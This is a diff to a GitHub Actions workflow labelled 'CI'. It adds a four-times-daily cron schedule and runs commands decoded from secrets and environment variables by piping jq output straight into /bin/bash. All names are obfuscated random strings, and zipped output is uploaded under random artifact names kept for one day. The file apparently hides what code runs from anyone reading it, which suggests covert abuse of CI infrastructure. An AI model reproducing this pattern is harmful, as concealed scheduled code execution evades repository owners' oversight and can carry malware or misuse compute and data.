@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '12 4,10,16,22 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -10,18 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          zeulc89: ${{ secrets.zeulc89 }}
+          q3: ${{ secrets.q3 }}
         run: |
-          printf '%s' "$zeulc89" | jq -r .ysrew821 | /bin/bash
-          printf '%s' "$tipn460" | jq -r .cip35 | /bin/bash
-          echo $ax66 | jq -r .bndzl7 | /bin/bash
-          echo $kxceq719 | jq -r .nqcht51098 | /bin/bash
-          printf '%s' "$f7992" | jq -r .hws03 | /bin/bash
+          printf '%s' "$q3" | jq -r .axp9 | /bin/bash
+          echo $cp4 | jq -r .aeate68635 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: lIsM9qmi
+          name: QFYpnNz9
           path: "*.zip"
           retention-days: 1
